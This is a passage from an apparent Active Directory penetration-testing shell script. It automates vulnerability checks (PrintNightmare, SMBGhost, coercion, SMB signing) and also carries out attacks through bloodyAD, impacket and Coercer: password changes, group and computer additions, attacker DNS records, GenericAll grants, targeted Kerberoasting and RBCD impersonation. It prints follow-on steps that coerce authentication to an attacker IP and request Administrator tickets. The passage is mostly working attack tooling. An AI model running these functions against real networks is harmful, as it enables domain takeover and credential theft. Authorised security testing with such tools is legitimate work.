Controllers\"\n    fi\n    smb_scan\n    run_command \"${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M coerce_plus --log ${output_dir}/Vulnerabilities/ne_coerce_output_${dc_domain}.txt\" 2>&1\n    echo -e \"\"\n}\n\nspooler_check() {\n    echo -e \"${BLUE}[*] Print Spooler check ${NC}\"\n    if [ \"${kerb_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n        curr_targets=\"Domain Controllers\"\n    fi\n    smb_scan\n    run_command \"${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M spooler --log ${output_dir}/Vulnerabilities/ne_spooler_output_${dc_domain}.txt\" 2>&1\n    echo -e \"\"\n}\n\nprintnightmare_check() {\n    echo -e \"${BLUE}[*] Print Nightmare check ${NC}\"\n    if [ \"${kerb_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n        curr_targets=\"Domain Controllers\"\n    fi\n    smb_scan\n    run_command \"${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M printnightmare --log ${output_dir}/Vulnerabilities/ne_printnightmare_output_${dc_domain}.txt\" 2>&1\n    echo -e \"\"\n}\n\nwebdav_check() {\n    echo -e \"${BLUE}[*] WebDAV check ${NC}\"\n    if [ \"${kerb_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n        curr_targets=\"Domain Controllers\"\n    fi\n    smb_scan\n    run_command \"${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M webdav --log ${output_dir}/Vulnerabilities/ne_webdav_output_${dc_domain}.txt\" 2>&1\n    echo -e \"\"\n}\n\nsmbsigning_check() {\n    echo -e \"${BLUE}[*] Listing servers with SMB signing disabled or not required ${NC}\"\n    if [ \"${kerb_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n        curr_targets=\"Domain Controllers\"\n    fi\n    smb_scan\n    run_command \"${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} --gen-relay-list ${output_dir}/Vulnerabilities/ne_smbsigning_output_${dc_domain}.txt\" 2>&1\n    if [ ! -s \"${output_dir}/Vulnerabilities/ne_smbsigning_output_${dc_domain}.txt\" ]; then\n        echo -e \"${PURPLE}[-] No servers with SMB signing disabled found ${NC}\"\n    fi\n    echo -e \"\"\n}\n\nntlmv1_check() {\n    echo -e \"${BLUE}[*] ntlmv1 check ${NC}\"\n    if [ \"${kerb_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n        curr_targets=\"Domain Controllers\"\n    fi\n    smb_scan\n    run_command \"${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M ntlmv1 --log ${output_dir}/Vulnerabilities/ne_ntlmv1_output_${dc_domain}.txt\" 2>&1\n    echo -e \"\"\n}\n\nsmbghost_check() {\n    echo -e \"${BLUE}[*] smbghost check ${NC}\"\n    if [ \"${kerb_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n        curr_targets=\"Domain Controllers\"\n    fi\n    smb_scan\n    run_command \"${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M smbghost --log ${output_dir}/Vulnerabilities/ne_smbghost_output_${dc_domain}.txt\" 2>&1\n    echo -e \"\"\n}\n\nrunasppl_check() {\n    echo -e \"${BLUE}[*] runasppl check ${NC}\"\n    if [ \"${kerb_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] Targeting DCs only${NC}\"\n        curr_targets=\"Domain Controllers\"\n    fi\n    smb_scan\n    run_command \"${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M runasppl --log ${output_dir}/Vulnerabilities/ne_runasppl_output_${dc_domain}.txt\" 2>&1\n    echo -e \"\"\n}\n\nrpcdump_check() {\n    if [ ! -f \"${impacket_rpcdump}\" ]; then\n        echo -e \"${RED}[-] rpcdump.py not found! Please verify the installation of impacket${NC}\"\n    elif [ \"${kerb_bool}\" == true ] || [ \"${aeskey_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] rpcdump does not support Kerberos authentication${NC}\"\n    else\n        mkdir -p \"${output_dir}/Vulnerabilities/RPCDump\"\n        echo -e \"${BLUE}[*] Impacket rpcdump${NC}\"\n        smb_scan\n        for i in $(/bin/cat \"${servers_smb_list}\"); do\n            echo -e \"${CYAN}[*] RPC Dump of ${i} ${NC}\"\n            run_command \"${impacket_rpcdump} ${argument_imp}\\\\@$i\" >\"${output_dir}/Vulnerabilities/RPCDump/impacket_rpcdump_output_${i}.txt\"\n            inte_prot=\"MS-RPRN MS-PAR MS-EFSR MS-FSRVP MS-DFSNM MS-EVEN\"\n            for prot in $inte_prot; do\n                prot_grep=$(grep -a \"$prot\" \"${output_dir}/Vulnerabilities/RPCDump/impacket_rpcdump_output_${i}.txt\")\n                if [ ! \"${prot_grep}\" == \"\" ]; then\n                    echo -e \"${GREEN}[+] $prot_grep found at ${i}${NC}\"\n                fi\n            done\n        done\n        echo -e \"\"\n    fi\n    echo -e \"\"\n}\n\ncoercer_check() {\n    if [ ! -f \"${coercer}\" ]; then\n        echo -e \"${RED}[-] Coercer not found! Please verify the installation of Coercer${NC}\"\n    elif [ \"${kerb_bool}\" == true ] || [ \"${aeskey_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] Coercer does not support Kerberos authentication${NC}\"\n    else\n        mkdir -p \"${output_dir}/Vulnerabilities/Coercer\"\n        echo -e \"${BLUE}[*] Running scan using coercer ${NC}\"\n        smb_scan\n        run_command \"${coercer} scan ${argument_coercer} -f ${servers_smb_list} --dc-ip $dc_ip --auth-type smb --export-xlsx ${output_dir}/Vulnerabilities/Coercer/coercer_output_${dc_domain}.xlsx\" | tee \"${output_dir}/Vulnerabilities/Coercer/coercer_output_${dc_domain}.txt\"\n        if grep -q -r \"SMB  Auth\" \"${output_dir}/Vulnerabilities/Coercer/\"; then\n            echo -e \"${GREEN}[+] Servers vulnerable to Coerce attacks found! Follow steps below for exploitation:${NC}\" | tee -a \"${output_dir}/Vulnerabilities/coercer_exploitation_steps_${dc_domain}.txt\"\n            echo -e \"${CYAN}1. Run responder on second terminal to capture hashes:${NC}\" | tee -a \"${output_dir}/Vulnerabilities/coercer_exploitation_steps_${dc_domain}.txt\"\n            echo -e \"sudo responder -I $attacker_interface\" | tee -a \"${output_dir}/Vulnerabilities/coercer_exploitation_steps_${dc_domain}.txt\"\n            echo -e \"${CYAN}2. Coerce target server:${NC}\" | tee -a \"${output_dir}/Vulnerabilities/coercer_exploitation_steps_${dc_domain}.txt\"\n            echo -e \"${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip\" | tee -a \"${output_dir}/Vulnerabilities/coercer_exploitation_steps_${dc_domain}.txt\"\n        fi\n        echo -e \"\"\n    fi\n    echo -e \"\"\n}\n\nprivexchange_check() {\n    if [ ! -f \"${privexchange}\" ]; then\n        echo -e \"${RED}[-] privexchange.py not found! Please verify the installation of privexchange${NC}\"\n    else\n        if [ \"${kerb_bool}\" == true ] || [ \"${aeskey_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] privexchange does not support Kerberos authentication${NC}\"\n        else\n            echo -e \"${BLUE}[*] Use Exchange Web Services to call PushSubscription API using privexchange. Please specify hostname of Exchange server:${NC}\"\n            if [ \"${nullsess_bool}\" == true ]; then\n                echo -e \"${YELLOW}[*] No credentials were provided, use ntlmrelayx and then modified httpattack.py, and then press ENTER to continue....${NC}\"\n                echo -e \"cd /home/USER/.local/pipx/venvs/impacket/lib/python3.XX/site-packages/impacket/examples/ntlmrelayx/attacks/httpattack.py\"\n                echo -e \"mv httpattack.py httpattack.py.old\"\n                echo -e \"wget https://raw.githubusercontent.com/dirkjanm/PrivExchange/master/httpattack.py\"\n                echo -e \"sed -i 's/attacker_url = .*$/attacker_url = \\$ATTACKER_URL/' httpattack.py\"\n                echo -e \"ntlmrelayx.py -t https://exchange.server.EWS/Exchange.asmx\"\n                read -rp \"\" </dev/tty\n            fi\n            echo -e \"${BLUE}[*] Please specify hostname of Exchange server:${NC}\"\n            echo -e \"${CYAN}[*] Example: 10.1.0.5 or EXCH01 or EXCH01.domain.com ${NC}\"\n            target_exchange=\"\"\n            read -rp \">> \" target_exchange </dev/tty\n            while [ \"${target_exchange}\" == \"\" ]; do\n                echo -e \"${RED}Invalid hostname.${NC} Please specify hostname of Exchange server:\"\n                read -rp \">> \" target_exchange </dev/tty\n            done\n            set_attackerIP\n            run_command \"${python3} ${privexchange} ${argument_privexchange} -ah ${attacker_IP} ${target_exchange}\" | tee \"${output_dir}/Vulnerabilities/privexchange_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nrunfinger_check() {\n    if [ ! -f \"${RunFinger}\" ]; then\n        echo -e \"${RED}[-] RunFinger.py not found! Please verify the installation of RunFinger${NC}\"\n    else\n        echo -e \"${BLUE}[*] Using RunFinger.py${NC}\"\n        smb_scan\n        current_dir=$(pwd)\n        cd \"${output_dir}/Vulnerabilities\" || exit\n        run_command \"${python3} ${RunFinger} -f ${servers_smb_list}\" | tee -a \"${output_dir}/Vulnerabilities/RunFinger_${dc_domain}.txt\"\n        cd \"${current_dir}\" || exit\n    fi\n    echo -e \"\"\n}\n\nldapnightmare_check() {\n    if [ ! -f \"${LDAPNightmare}\" ]; then\n        echo -e \"${RED}[-] LDAPNightmare (CVE-2024-49113-checker) not found! Please verify the installation of LDAPNightmare${NC}\"\n    else\n        echo -e \"${BLUE}[*] Running LDAPNightmare check against domain${NC}\"\n        run_command \"${python3} ${LDAPNightmare} ${target_dc}\" | tee -a \"${output_dir}/Vulnerabilities/LDAPNightmare_${dc_domain}.txt\"\n    fi\n    echo -e \"\"\n}\n\n###### mssql_checks: MSSQL scan\nmssql_enum() {\n    if [ ! -f \"${windapsearch}\" ] || [ ! -f \"${impacket_GetUserSPNs}\" ]; then\n        echo -e \"${RED}[-] Please verify the location of windapsearch and GetUserSPNs.py${NC}\"\n    else\n        echo -e \"${BLUE}[*] MSSQL Enumeration${NC}\"\n        sed -e 's/ //' -e 's/\\$//' -e 's/.*/\\U&/' \"${output_dir}\"/DomainRecon/Servers/sql_list_*_\"${dc_domain}.txt\" | sort -uf >\"${sql_hostname_list}\" 2>&1\n        for i in $(/bin/cat \"${sql_hostname_list}\"); do\n            grep -i \"$(echo \"$i\" | cut -d \".\" -f 1)\" \"${output_dir}/DomainRecon/dns_records_${dc_domain}.csv\" 2>/dev/null | grep \"A,\" | grep -v \"DnsZones\\|@\" | cut -d \",\" -f 3 | sort -u >\"${sql_ip_list}\"\n        done\n        if [ -f \"${target_sql}\" ]; then\n            run_command \"${netexec} ${ne_verbose} mssql ${target_sql} ${argument_ne} -M mssql_priv --log ${output_dir}/MSSQL/ne_mssql_priv_output_${dc_domain}.txt\" 2>&1\n        else\n            echo -e \"${PURPLE}[-] No SQL servers found! Please re-run SQL enumeration and try again..${NC}\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nmssql_relay_check() {\n    if [ ! -f \"${mssqlrelay}\" ]; then\n        echo -e \"${RED}[-] Please verify the location of mssqlrelay${NC}\"\n    else\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] mssqlrelay requires credentials${NC}\"\n        else\n            echo -e \"${BLUE}[*] MSSQL Relay Check${NC}\"\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"\"; else ldaps_param=\"-scheme ldap\"; fi\n            run_command \"${mssqlrelay} ${mssqlrelay_verbose} checkall ${ldaps_param} ${argument_mssqlrelay} -ns ${dc_ip} -dns-tcp -windows-auth\" | tee \"${output_dir}/MSSQL/mssql_relay_output_${dc_domain}.txt\" 2>&1\n        fi\n    fi\n    echo -e \"\"\n}\n\nmssqlclient_console() {\n    if [ ! -f \"${impacket_mssqlclient}\" ]; then\n        echo -e \"${RED}[-] mssqlclient.py not found! Please verify the installation of impacket ${NC}\"\n    elif [ \"${nullsess_bool}\" == true ]; then\n        echo -e \"${PURPLE}[-] mssqlclient requires credentials${NC}\"\n    else\n        echo -e \"${BLUE}[*] Please specify target IP or hostname:${NC}\"\n        echo -e \"${CYAN}[*] Example: 10.1.0.5 or SQL01 or SQL01.domain.com ${NC}\"\n        read -rp \">> \" mssqlclient_target </dev/tty\n        while [ \"${mssqlclient_target}\" == \"\" ]; do\n            echo -e \"${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:\"\n            read -rp \">> \" mssqlclient_target </dev/tty\n        done\n        echo -e \"${BLUE}[*] Opening mssqlclient.py console on target: $mssqlclient_target ${NC}\"\n        run_command \"${impacket_mssqlclient} ${argument_imp}\\\\@${mssqlclient_target} -windows-auth\" 2>&1 | tee -a \"${output_dir}/MSSQL/impacket_mssqlclient_output.txt\"\n    fi\n    echo -e \"\"\n}\n\nmssqlpwner_console() {\n    if [ ! -f \"${mssqlpwner}\" ]; then\n        echo -e \"${RED}[-] Please verify the location of mssqlpwner${NC}\"\n    else\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] mssqlpwner requires credentials${NC}\"\n        else\n            current_dir=$(pwd)\n            cd \"${output_dir}/MSSQL\" || exit\n            echo -e \"${BLUE}[*] Please specify target IP or hostname:${NC}\"\n            echo -e \"${CYAN}[*] Example: 10.1.0.5 or SQL01 or SQL01.domain.com ${NC}\"\n            read -rp \">> \" mssqlpwner_target </dev/tty\n            while [ \"${mssqlpwner_target}\" == \"\" ]; do\n                echo -e \"${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:\"\n                read -rp \">> \" mssqlpwner_target </dev/tty\n            done\n            echo -e \"${BLUE}[*] Opening mssqlpwner console${NC}\"\n            run_command \"${mssqlpwner} ${argument_mssqlpwner}@${mssqlpwner_target} -dc-ip ${dc_ip} -windows-auth interactive\" | tee -a \"${output_dir}/MSSQL/mssqlpwner_output_${dc_domain}.txt\" 2>&1\n            cd \"${current_dir}\" || exit\n        fi\n    fi\n    echo -e \"\"\n}\n\n###### Modification of AD Objects or Attributes\nchange_pass() {\n    if [ ! -f \"${bloodyad}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of bloodyad{NC}\"\n    else\n        mkdir -p \"${output_dir}/Modification/bloodyAD\"\n        if [ \"${aeskey_bool}\" == true ] || [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-s\"; else ldaps_param=\"\"; fi\n            echo -e \"${BLUE}[*] Changing passwords of a user or computer account. Please specify target:${NC}\"\n            echo -e \"${CYAN}[*] Example: user01 or DC01$ ${NC}\"\n            target_passchange=\"\"\n            read -rp \">> \" target_passchange </dev/tty\n            while [ \"${target_passchange}\" == \"\" ]; do\n                echo -e \"${RED}Invalid name.${NC} Please specify target:\"\n                read -rp \">> \" target_passchange </dev/tty\n            done\n            echo -e \"${BLUE}[*] Please specify new password (default: Summer3000_):${NC}\"\n            pass_passchange=\"\"\n            read -rp \">> \" pass_passchange </dev/tty\n            if [[ ${pass_passchange} == \"\" ]]; then pass_passchange=\"Summer3000_\"; fi\n            echo -e \"${CYAN}[*] Changing password of ${target_passchange} to ${pass_passchange}${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set password ${target_passchange} ${pass_passchange}\" 2>&1 | tee -a \"${output_dir}/Modification/bloodyAD/bloodyad_out_passchange_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nadd_group_member() {\n    if [ ! -f \"${bloodyad}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of bloodyad{NC}\"\n    else\n        mkdir -p \"${output_dir}/Modification/bloodyAD\"\n        if [ \"${aeskey_bool}\" == true ] || [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-s\"; else ldaps_param=\"\"; fi\n            echo -e \"${BLUE}[*] Adding user to group. Please specify target group:${NC}\"\n            echo -e \"${CYAN}[*] Example: group01 ${NC}\"\n            target_groupmem=\"\"\n            read -rp \">> \" target_groupmem </dev/tty\n            while [ \"${target_groupmem}\" == \"\" ]; do\n                echo -e \"${RED}Invalid name.${NC} Please specify target group:\"\n                read -rp \">> \" target_groupmem </dev/tty\n            done\n            echo -e \"${BLUE}[*] Please specify user to add to the group (default: current user):${NC}\"\n            user_groupmem=\"\"\n            read -rp \">> \" user_groupmem </dev/tty\n            if [ \"${user_groupmem}\" == \"\" ]; then user_groupmem=\"${user}\"; fi\n            echo -e \"${CYAN}[*] Adding ${user_groupmem} to group ${target_groupmem}${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add groupMember '${target_groupmem}' '${user_groupmem}'\" 2>&1 | tee -a \"${output_dir}/Modification/bloodyAD/bloodyad_out_groupmem_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nadd_computer() {\n    if [ ! -f \"${bloodyad}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of bloodyad{NC}\"\n    else\n        mkdir -p \"${output_dir}/Modification/bloodyAD\"\n        if [ \"${aeskey_bool}\" == true ] || [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-s\"; else ldaps_param=\"\"; fi\n            echo -e \"${BLUE}[*] Adding new computer account. Please specify computer hostname (default: WS3000):${NC}\"\n            read -rp \">> \" host_addcomp </dev/tty\n            if [[ ${host_addcomp} == \"\" ]]; then host_addcomp=\"WS3000\"; fi\n            echo -e \"${BLUE}[*] Please specify new password (default: Summer3000_):${NC}\"\n            read -rp \">> \" pass_addcomp </dev/tty\n            if [[ ${pass_addcomp} == \"\" ]]; then pass_addcomp=\"Summer3000_\"; fi\n            echo -e \"${CYAN}[*] Creating computer ${host_addcomp} with password ${pass_addcomp}${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add computer '${host_addcomp}' '${pass_addcomp}'\" 2>&1 | tee -a \"${output_dir}/Modification/bloodyAD/bloodyad_out_addcomp_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\ndnsentry_add() {\n    if [ ! -f \"${bloodyad}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of bloodyad{NC}\"\n    else\n        mkdir -p \"${output_dir}/Modification/bloodyAD\"\n        if [ \"${aeskey_bool}\" == true ] || [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-s\"; else ldaps_param=\"\"; fi\n            echo -e \"${BLUE}[*] Please specify hostname of the attacker DNS entry (default: kali):${NC}\"\n            hostname_dnstool=\"\"\n            read -rp \">> \" hostname_dnstool </dev/tty\n            if [ \"${hostname_dnstool}\" == \"\" ]; then hostname_dnstool=\"kali\"; fi\n            echo -e \"${BLUE}[*] Please confirm the IP of the attacker's machine:${NC}\"\n            set_attackerIP\n            echo -e \"${BLUE}[*] Adding new DNS entry for Active Directory integrated DNS${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add dnsRecord ${hostname_dnstool} ${attacker_IP}\" | tee -a \"${output_dir}/Modification//bloodyAD/bloodyad_dns_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nchange_owner() {\n    if [ ! -f \"${bloodyad}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of bloodyad{NC}\"\n    else\n        mkdir -p \"${output_dir}/Modification/bloodyAD\"\n        if [ \"${aeskey_bool}\" == true ] || [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-s\"; else ldaps_param=\"\"; fi\n            echo -e \"${BLUE}[*] Changing owner of a user, computer, group, etc. Please specify target:${NC}\"\n            echo -e \"${CYAN}[*] Example: user01 or DC01$ or group01 ${NC}\"\n            target_ownerchange=\"\"\n            read -rp \">> \" target_ownerchange </dev/tty\n            while [ \"${target_ownerchange}\" == \"\" ]; do\n                echo -e \"${RED}Invalid name.${NC} Please specify target:\"\n                read -rp \">> \" target_ownerchange </dev/tty\n            done\n            echo -e \"${CYAN}[*] Changing Owner of ${target_ownerchange} to ${user}${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set owner ${target_ownerchange} '${user}'\" 2>&1 | tee -a \"${output_dir}/Modification/bloodyAD/bloodyad_out_ownerchange_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nadd_genericall() {\n    if [ ! -f \"${bloodyad}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of bloodyad{NC}\"\n    else\n        mkdir -p \"${output_dir}/Modification/bloodyAD\"\n        if [ \"${aeskey_bool}\" == true ] || [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-s\"; else ldaps_param=\"\"; fi\n            echo -e \"${BLUE}[*] Adding GenericAll rights of a user, computer, group, etc. Please specify target:${NC}\"\n            echo -e \"${CYAN}[*] Example: user01 or DC01$ or group01 ${NC}\"\n            target_genericall=\"\"\n            read -rp \">> \" target_genericall </dev/tty\n            while [ \"${target_genericall}\" == \"\" ]; do\n                echo -e \"${RED}Invalid name.${NC} Please specify target:\"\n                read -rp \">> \" target_genericall </dev/tty\n            done\n            echo -e \"${CYAN}[*] Adding GenericAll rights on ${target_genericall} to ${user}${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add genericAll ${target_genericall} '${user}'\" 2>&1 | tee -a \"${output_dir}/Modification/bloodyAD/bloodyad_out_genericall_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\ntargetedkerberoast_attack() {\n    if [ ! -f \"${targetedKerberoast}\" ]; then\n        echo -e \"${RED}[-] Please verify the location of targetedKerberoast.py${NC}\"\n    else\n        if [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] targetedKerberoast requires credentials${NC}\"\n        else\n            echo -e \"${BLUE}[*] Targeted Kerberoasting Attack (Noisy!)${NC}\"\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"--use-ldaps\"; else ldaps_param=\"\"; fi\n            run_command \"${python3} ${targetedKerberoast} ${argument_targkerb} -D ${dc_domain} --dc-ip ${dc_ip} ${ldaps_param} --only-abuse --dc-host ${dc_NETBIOS} -o ${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt\" 2>&1 | tee \"${output_dir}/Modification/targetedkerberoast_output_${dc_domain}.txt\"\n        fi\n    fi\n    echo -e \"\"\n}\n\nrbcd_attack() {\n    if [ ! -f \"${bloodyad}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of bloodyad{NC}\"\n    else\n        mkdir -p \"${output_dir}/Modification/bloodyAD\"\n        if [ \"${aeskey_bool}\" == true ] || [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-s\"; else ldaps_param=\"\"; fi\n            echo -e \"${BLUE}[*] Performing RBCD attack: impersonate users on target via S4U2Proxy. Please specify target:${NC}\"\n            echo -e \"${CYAN}[*] Example: DC01 ${NC}\"\n            target_rbcd=\"\"\n            read -rp \">> \" target_rbcd </dev/tty\n            while [ \"${target_rbcd}\" == \"\" ]; do\n                echo -e \"${RED}Invalid name.${NC} Please specify target:\"\n                read -rp \">> \" target_rbcd </dev/tty\n            done\n            echo -e \"${BLUE}[*] Please specify account under your control:${NC}\"\n            echo -e \"${CYAN}[*] Example: user01 or DC01$ ${NC}\"\n            service_rbcd=\"\"\n            read -rp \">> \" service_rbcd </dev/tty\n            while [ \"${service_rbcd}\" == \"\" ]; do\n                echo -e \"${RED}Invalid name.${NC} Please specify account under your control:\"\n                read -rp \">> \" service_rbcd </dev/tty\n            done\n            echo -e \"${CYAN}[*] Performing RBCD attack against ${target_rbcd} using account ${service_rbcd}${NC}\"\n            run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add rbcd '${target_rbcd}$' '${service_rbcd}'\" 2>&1 | tee -a \"${output_dir}/Modification/bloodyAD/bloodyad_out_rbcd_${dc_domain}.txt\"\n            if grep -q \"can now impersonate users\" \"${output_dir}/Modification/bloodyAD/bloodyad_out_rbcd_${dc_domain}.txt\"; then\n                echo -e \"${GREEN}[+] RBCD Attack successful! Run command below to generate ticket${NC}\"\n                echo -e \"${impacket_getST} -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip} '${domain}/${service_rbcd}:<PASSWORD>'\"\n                echo -e \"${CYAN}[!] Run command below to remove impersonation rights:${NC}\"\n                echo -e \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove rbcd '${target_rbcd}$' '${service_rbcd}'\"\n            fi\n        fi\n    fi\n    echo -e \"\"\n}\n\nrbcd_spnless_attack() {\n    if [ ! -f \"${bloodyad}\" ]; then\n        echo -e \"${RED}[-] Please verify the installation of bloodyad{NC}\"\n    else\n        mkdir -p \"${output_dir}/Modification/bloodyAD\"\n        if [ \"${aeskey_bool}\" == true ] || [ \"${nullsess_bool}\" == true ]; then\n            echo -e \"${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}\"\n        else\n            if [ \"${ldaps_bool}\" == true ]; then ldaps_param=\"-s\"; else ldaps_param=\"\"; fi\n            echo -e \"${BLUE}[*] Performing SPN-less RBCD attack: impersonate users on target via S4U2Proxy. Please specify target:${NC}\"\n            echo -e \"${CYAN}[*] Example: DC01 ${NC}\"\n            target_rbcd=\"\"\n            read -rp \">> \" target_rbcd </dev/tty\n            while [ \"${target_rbcd}\" == \"\" ]; do\n                echo -e \"${RED}Invalid name.${NC} Please specify target:\"\n                read -rp \">> \" target_rbcd </dev/tty\n            done\n            echo -e \"${BLUE}[*] Please specify SPN-less account under your control:${NC}\"\n            echo -e \"${CYAN}[*] Example: user01 ${NC}\"\n            user_spnless=\"\"\n            read -rp \">> \" user_spnless </dev/tty\n            while [ \"${user_spnless}\" == \"\" ]; do\n                echo -e \"${RED}Invalid name.${NC} Please specify account under your control:\"\n                read -rp \">> \" user_spnless </dev/tty\n            done\n            echo -e \"${YELLOW}[!] Warning: This will modify the password of the SPN-less account under your control:${NC}\"\n            echo -e \"${BLUE}[*] Please provide password or NT hash of SPN-less account under your control:${NC}\"\n            pass_spnless=\"\"\n            read -rp \">> \" pass_spnless </dev/tty\n            while [ \"${pass_spnless}\" == \"\" ]; do\n                echo -e \"${RED}Invalid password.${NC} Please specify password or NT hash of account under your control:\"\n                read -rp \">> \" pass_spnless </dev/tty\n            done\n            echo -e \"${CYAN}[*] Performing RBCD attack against ${target_rbcd} using SPN-less account ${user_spnless}${NC}\"\n            if [ ! -f \"${impacket_getTGT}\" ]; then\n                echo -e \"${RED}[-] getTGT.py not found! Please verify the installation of impacket${NC}\"\n            else\n                if [[ ${#pass_spnless} -eq 32 ]]; then\n                    spnless_hash=\"${pass_spnless}\"\n                else\n                    spnless_hash=$(iconv -f ASCII -t UTF-16LE <(printf \"%s\" \"$pass_spnless\") | $(which openssl) dgst -md4 | cut -d \" \" -f 2)\n                fi\n                current_dir=$(pwd)\n                cd \"${output_dir}/Modification/\" || exit\n                echo -e \"${CYAN}[*] Requesting TGT for user ${user_spnless}${NC}\"\n                run_command \"${impacket_getTGT} ${domain}/${user_spnless} -hashes :${spnless_hash} -dc-ip ${dc_ip}\" | grep -v \"Impacket\" | sed '/^$/d' | tee -a \"${output_dir}/Modification/impacket_spnless_changepasswd_${dc_domain}.txt\"\n                if [ -f \"${output_dir}/Modification/${user_spnless}.ccache\" ]; then\n                    krb_ticket=\"${output_dir}/Modification/${user_spnless}.ccache\"\n                    echo -e \"${GREEN}[+] TGT generated successfully:${NC} $krb_ticket\"\n                    run_command \"${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add rbcd '${target_rbcd}$' '${user_spnless}'\" 2>&1 | tee -a \"${output_dir}/Modification/bloodyAD/bloodyad_out_rbcdspnless_${dc_domain}.txt\"\n                    ticketsesskey=$(${impacket_describeticket} \"${output_dir}/Modification/${user_spnless}.ccache\" | grep 'Ticket Session Key' | cut -d \" \" -f 17)\n                    run_command \"${impacket_changepasswd} ${domain}/${user_spnless}\\\\@${dc_ip} -hashes :${spnless_hash} -newhashes :${ticketsesskey}\" | tee -a \"${output_dir}/Modification/impacket_spnless_changepasswd_${dc_domain}.txt\"\n                    if grep -q \"can now impersonate users\" 